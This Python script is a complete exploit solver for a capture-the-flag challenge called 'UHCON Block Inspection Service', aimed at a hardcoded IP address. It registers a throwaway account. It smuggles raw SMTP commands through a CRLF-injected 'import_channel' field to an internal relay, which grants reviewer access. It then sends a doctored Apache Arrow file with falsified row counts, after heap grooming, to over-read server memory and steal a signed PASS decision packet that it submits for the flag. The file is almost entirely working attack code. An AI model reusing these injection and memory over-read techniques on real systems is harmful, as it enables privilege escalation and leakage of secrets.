#!/usr/bin/env python3
"""End-to-end solver for UHCON Block Inspection Service.

The solver creates a disposable portal account, acquires reviewer-assist,
uses an Arrow fixed-width over-read to recover its signed decision packet,
submits the packet, and prints the flag.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import secrets
import struct
import sys
import time
from dataclasses import dataclass

import pyarrow as pa
import pyarrow.ipc as ipc
import requests


DEFAULT_BASE = "http://43.203.187.40:8080"
LEAK_ROWS = 2048
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]{1,300}\}", re.I)
PACKET_RE = re.compile(rb"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{100,})\.([0-9a-f]{64})(?![0-9a-f])")


@dataclass
class Principal:
    username: str
    password: str
    inspection_id: str
    review_id: str


def require(response: requests.Response, label: str) -> requests.Response:
    if response.status_code >= 400:
        raise RuntimeError(
            f"{label}: HTTP {response.status_code}: {response.text[:1000]}"
        )
    return response


def b64url_encode_json(value: object) -> str:
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def register(base: str, session: requests.Session) -> tuple[str, str]:
    # Keep all three unique identity fields well below the portal's length cap.
    nonce = f"{int(time.time())}{secrets.token_hex(3)}"
    username = "aleak" + nonce
    password = "BIS_" + secrets.token_hex(16)
    response = require(
        session.post(
            base + "/register",
            data={
                "username": username,
                "password": password,
                "display_name": "Arrow packet recovery",
                "handle": username,
                "vendor_name": "Arrow packet recovery",
            },
            timeout=20,
        ),
        "register",
    )
    if "/login" in response.url:
        response = require(
            session.post(
                base + "/login",
                data={"username": username, "password": password},
                timeout=20,
            ),
            "login",
        )
        if "/login" in response.url:
            raise RuntimeError("login did not create an authenticated session")
    print(f"[+] account: {username}", flush=True)
    return username, password


def create_failed_inspection(base: str, session: requests.Session) -> str:
    started = require(
        session.post(
            base + "/inspections",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "start inspection",
    ).json()
    inspection_id = started["inspection"]["id"]
    finished = require(
        session.post(
            base + f"/inspections/{inspection_id}/finish",
            json={},
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "finish inspection",
    ).json()
    outcome = (finished.get("inspection", {}).get("result") or {}).get("outcome")
    if outcome != "FAIL":
        raise RuntimeError(f"expected a fresh FAIL inspection, got {outcome!r}")
    print(f"[+] failed inspection: {inspection_id}", flush=True)
    return inspection_id


def gain_reviewer_assist(
    base: str, session: requests.Session, inspection_id: str
) -> str:
    nonce = secrets.token_hex(8)
    review = require(
        session.post(
            base + "/rechecks",
            data={
                "inspection_id": inspection_id,
                "title": "Reviewer assist " + nonce,
                "evidence_html": "<section>Controlled review package.</section>",
                "renderer": "timeline",
                "variant": "scoreboard",
            },
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "create recheck",
    ).json()
    review_id = review["id"]
    if review.get("status") != "queued":
        raise RuntimeError(f"new recheck is not queued: {review!r}")

    # This is the exact document shape that places the review in
    # assist_granted. Redeeming it turns on the QA reviewer-assist seat.
    event = {
        "timeline": [{"decision": "routine"}],
        "review": {"timeline": [{"decision": "escalate"}]},
        "permissions": [{"grant": "viewer"}],
        "pack": {"permissions": [{"grant": "assessor"}]},
    }
    import_key = "assist" + nonce
    record = (
        f"X-Yard-Ops-Event: import={import_key};review={review_id};"
        "eventState=pending;eventKind=coating-defect;eventTag=escalate;"
        "autoApprove=false;event=" + b64url_encode_json(event)
    )
    smtp = "\r\n".join(
        (
            "EHLO coatmetrics-provider",
            "MAIL FROM:<provider@coatmetrics.local>",
            "RCPT TO:<gauge-relay@gauge-relay.local>",
            "DATA",
            record,
            ".",
            "QUIT",
            "",
        )
    )
    imported = require(
        session.post(
            base + "/captures/import",
            json={
                "review_id": review_id,
                "import_key": import_key,
                "capture_metadata_url": "http://gauge-relay:2525/",
                "import_channel": "coatmetrics-v2\r\n" + smtp,
                "headers": {},
            },
            headers={"Accept": "application/json"},
            timeout=30,
        ),
        "relay import",
    ).json()
    print(f"[+] relay accepted: {json.dumps(imported, separators=(',', ':'))}", flush=True)

    redeem_path = f"/rechecks/{review_id}/redeem"
    for _ in range(80):
        page = require(session.get(base + "/rechecks", timeout=20), "list rechecks").text
        if redeem_path in page:
            break
        time.sleep(0.25)
    else:
        raise RuntimeError("assist_granted redeem link did not appear")

    redeemed = require(
        session.post(
            base + redeem_path,
            headers={"Accept": "application/json"},
            timeout=20,
        ),
        "redeem reviewer assist",
    )
    print(f"[+] reviewer assist redeemed: {redeemed.text[:500]}", flush=True)
    return review_id


def align8(value: int) -> int:
    return (value + 7) & ~7


def make_pass_arrow(inspection_id: str) -> bytes:
    """Build the known-good workbook that causes one signed PASS packet."""
    count = LEAK_ROWS
    schema = pa.schema(
        [
            pa.field("inspection_id", pa.string(), nullable=False),
            pa.field("outcome", pa.string(), nullable=False),
            pa.field("measured_avg", pa.float64(), nullable=False),
            pa.field("spec_min", pa.float64(), nullable=False),
        ]
    )
    batch = pa.record_batch(
        [
            pa.array([inspection_id] * count, type=pa.string()),
            pa.array(["PASS"] * count, type=pa.string()),
            pa.array([100.0] * count, type=pa.float64()),
            pa.array([1.0] * count, type=pa.float64()),
        ],
        schema=schema,
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def prime_pass_packet(base: str, session: requests.Session, inspection_id: str) -> dict:
    """Queue a valid, account-bound PASS packet before reading stale heap data."""
    workbook = make_pass_arrow(inspection_id)
    response = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=workbook,
            headers={"Content-Type": "application/octet-stream", "Accept": "application/json"},
            timeout=50,
        ),
        "prime PASS workbook",
    ).json()
    if response.get("declared_rows") != LEAK_ROWS or response.get("rows_returned") != LEAK_ROWS:
        raise RuntimeError(f"PASS workbook was not fully accepted: {response!r}")
    summary = {key: value for key, value in response.items() if key != "rows"}
    print(f"[+] PASS packet primed: {json.dumps(summary, separators=(',', ':'))}", flush=True)
    return summary


def u16(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<H", data, offset)[0]


def u32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def i32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<i", data, offset)[0]


def i64(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<q", data, offset)[0]


def flatbuffer_fields(data: bytes | bytearray, table: int) -> list[int]:
    vtable = table - i32(data, table)
    count = (u16(data, vtable) - 4) // 2
    return [u16(data, vtable + 4 + index * 2) for index in range(count)]


def message_body_length(metadata: bytes | bytearray) -> int:
    root = u32(metadata, 0)
    message_fields = flatbuffer_fields(metadata, root)
    if len(message_fields) <= 3 or message_fields[3] == 0:
        return 0
    return i64(metadata, root + message_fields[3])


def make_overread_arrow() -> tuple[bytes, dict[str, int]]:
    """Build one binary(64) row, then claim that 2048 rows exist."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch([pa.array([b"A" * 64], type=arrow_type)], schema=schema)
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    payload = bytearray(sink.getvalue().to_pybytes())

    cursor = 8
    messages: list[tuple[int, int, int]] = []
    while cursor + 8 <= len(payload) - 10:
        if u32(payload, cursor) != 0xFFFFFFFF:
            break
        metadata_length = u32(payload, cursor + 4)
        if metadata_length == 0:
            break
        metadata_start = cursor + 8
        metadata = payload[metadata_start : metadata_start + metadata_length]
        body_length = message_body_length(metadata)
        messages.append((metadata_start, metadata_length, body_length))
        cursor = metadata_start + align8(metadata_length) + align8(body_length)
    if len(messages) != 2:
        raise RuntimeError(f"unexpected Arrow message layout: {messages!r}")

    metadata_start, metadata_length, body_length = messages[1]
    metadata = payload[metadata_start : metadata_start + metadata_length]
    root = u32(metadata, 0)
    message_fields = flatbuffer_fields(metadata, root)
    header_field = root + message_fields[2]
    record_batch = header_field + u32(metadata, header_field)
    record_fields = flatbuffer_fields(metadata, record_batch)

    row_count_offset = metadata_start + record_batch + record_fields[0]
    nodes_field = record_batch + record_fields[1]
    nodes_vector = nodes_field + u32(metadata, nodes_field)
    node_length_offset = metadata_start + nodes_vector + 4
    if i64(payload, row_count_offset) != 1 or i64(payload, node_length_offset) != 1:
        raise RuntimeError("Arrow layout checks failed before mutation")
    struct.pack_into("<q", payload, row_count_offset, LEAK_ROWS)
    struct.pack_into("<q", payload, node_length_offset, LEAK_ROWS)

    return bytes(payload), {
        "file_bytes": len(payload),
        "metadata_start": metadata_start,
        "metadata_length": metadata_length,
        "body_length": body_length,
        "row_count_offset": row_count_offset,
        "node_length_offset": node_length_offset,
    }


def make_heap_groom_arrow() -> bytes:
    """Leave a mapped 128 KiB fixed-width value buffer in the parser heap."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch(
        [pa.array([b"G" * 64] * LEAK_ROWS, type=arrow_type)], schema=schema
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def decode_leak(response_json: dict) -> bytes:
    rows = response_json.get("rows")
    if not isinstance(rows, list) or len(rows) != LEAK_ROWS:
        raise RuntimeError(f"expected {LEAK_ROWS} leaked rows, got {type(rows).__name__}")
    chunks: list[bytes] = []
    for row in rows:
        if not isinstance(row, list) or not row or not isinstance(row[0], str):
            raise RuntimeError("unexpected fixed-width binary JSON representation")
        chunks.append(b64url_decode(row[0]))
    return b"".join(chunks)


def bound_packets(raw: bytes, inspection_id: str, review_id: str) -> list[tuple[int, str, dict]]:
    found: list[tuple[int, str, dict]] = []
    seen: set[str] = set()
    for match in PACKET_RE.finditer(raw):
        token = match.group(0).decode()
        if token in seen:
            continue
        seen.add(token)
        try:
            document = json.loads(b64url_decode(match.group(1).decode()))
        except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
            continue
        if (
            document.get("inspection_id") == inspection_id
            and document.get("review_id") == review_id
            and document.get("kind") == "conformance_decision_packet"
            and document.get("outcome") == "PASS"
        ):
            found.append((match.start(), token, document))
    return found


def recover_packet(
    base: str, session: requests.Session, inspection_id: str, review_id: str
) -> tuple[str, dict, dict]:
    payload, layout = make_overread_arrow()
    groom_payload = make_heap_groom_arrow()
    print(f"[+] malformed Arrow layout: {json.dumps(layout, separators=(',', ':'))}", flush=True)

    # One valid fixed-width batch maps a 128 KiB arena before the malformed
    # read.  It consumes a queue slot, so groom only once: after the PASS
    # workbook there is room for this allocation and at most two leak reads.
    groom = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=groom_payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        ),
        "heap groom workbook",
    )
    print(f"[+] heap groom accepted: HTTP {groom.status_code}", flush=True)

    for attempt in range(1, 3):
        response = session.post(
            base + "/qa/workbooks/preview",
            data=payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        )
        if response.status_code >= 400:
            print(
                f"[-] workbook leak attempt {attempt}: HTTP {response.status_code}: "
                f"{response.text[:200]}",
                flush=True,
            )
            time.sleep(0.25)
            continue
        parsed = response.json()
        raw = decode_leak(parsed)
        candidates = bound_packets(raw, inspection_id, review_id)
        print(
            f"[+] leak attempt {attempt}: {len(raw)} bytes, "
            f"{len(PACKET_RE.findall(raw))} signed-looking values, "
            f"{len(candidates)} bound packet(s)",
            flush=True,
        )
        if candidates:
            offset, token, document = max(
                candidates, key=lambda item: int(item[2].get("issued_at", 0))
            )
            print(f"[+] selected packet at leak offset 0x{offset:x}: {json.dumps(document)}", flush=True)
            return token, document, layout
        time.sleep(0.25)
    raise RuntimeError("the four-entry queue filled without leaking the primed PASS packet")


def submit_and_get_flag(
    base: str, session: requests.Session, packet: str
) -> tuple[dict, list[str]]:
    response = session.post(
        base + "/qa/decision-packets/submit",
        json={"packet": packet},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    try:
        submitted = response.json()
    except ValueError as error:
        raise RuntimeError(f"packet submit returned non-JSON HTTP {response.status_code}") from error
    if response.status_code not in {200, 409}:
        raise RuntimeError(f"packet submit: HTTP {response.status_code}: {submitted!r}")
    if submitted.get("record_state") not in {"decision_packet_recorded", "unchanged"}:
        raise RuntimeError(f"unexpected submit result: {submitted!r}")
    print(f"[+] packet submitted: {json.dumps(submitted, separators=(',', ':'))}", flush=True)

    flags: set[str] = set()
    for _ in range(20):
        for path in ("/dashboard", "/qa/workspace", "/conformance"):
            page = require(session.get(base + path, timeout=20), path).text
            flags.update(FLAG_RE.findall(page))
        if flags:
            break
        time.sleep(0.25)
    return submitted, sorted(flags)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    base = args.base.rstrip("/")

    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-BIS-solver/1.0"
    try:
        username, password = register(base, session)
        inspection_id = create_failed_inspection(base, session)
        review_id = gain_reviewer_assist(base, session, inspection_id)
        principal = Principal(username, password, inspection_id, review_id)
        print(
            f"[+] principal: {json.dumps({'username': username, 'inspection_id': inspection_id, 'review_id': review_id})}",
            flush=True,
        )

        pass_preview = prime_pass_packet(base, session, inspection_id)
        packet, packet_document, layout = recover_packet(
            base, session, inspection_id, review_id
        )
        submitted, flags = submit_and_get_flag(base, session, packet)
        result = {
            "account": {
                "username": principal.username,
                "inspection_id": principal.inspection_id,
                "review_id": principal.review_id,
            },
            "pass_preview": pass_preview,
            "arrow_layout": layout,
            "packet_document": packet_document,
            "submit": submitted,
            "flags": flags,
        }
        print(json.dumps(result, ensure_ascii=False, indent=2), flush=True)
        if not flags:
            print("[-] packet recorded but no flag was rendered", file=sys.stderr)
            return 2
        for flag in flags:
            print(f"FLAG: {flag}")
        return 0
    except (requests.RequestException, KeyError, RuntimeError, ValueError) as error:
        print(f"[-] {type(error).__name__}: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
